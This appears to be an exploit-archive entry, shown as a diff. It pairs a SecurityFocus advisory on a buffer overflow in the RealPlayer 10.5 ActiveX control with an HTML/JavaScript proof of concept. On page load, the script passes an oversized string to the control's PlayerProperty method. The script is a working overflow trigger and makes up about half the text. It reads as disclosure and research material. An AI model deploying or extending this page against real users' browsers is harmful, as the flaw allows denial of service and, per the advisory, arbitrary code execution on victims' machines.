@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/26586/info
+
+The RealPlayer ActiveX control is prone to a buffer-overflow vulnerability because the software fails to properly bounds-check user-supplied data before copying it to an insufficiently sized buffer.
+
+A remote attacker may exploit this vulnerability by presenting a malicious file to a victim and enticing them to open it with the vulnerable application.
+
+Successful exploits can allow attackers to run arbitrary code in the context of the user running an application that uses the control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions.
+
+This issue affects RealPlayer 10.5; other versions may also be affected.
+
+NOTE: This issue was originally covered in BID 22811 - RealMedia RealPlayer Ierpplug.DLL ActiveX Control Multiple Buffer Overflow Vulnerabilities. 
+
+<!--
+written by e.b.
+-->
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+    var s = "AAAA";
+
+    while (s.length < 999999) s=s+s;
+
+     var obj = new ActiveXObject("IERPCTL.IERPCTL"); //{FDC7A535-4070-4B92-A0EA-D9994BCC0DC5}
+
+
+      var obj2 = obj.PlayerProperty(s);
+
+
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();">
+
+ </body>
+
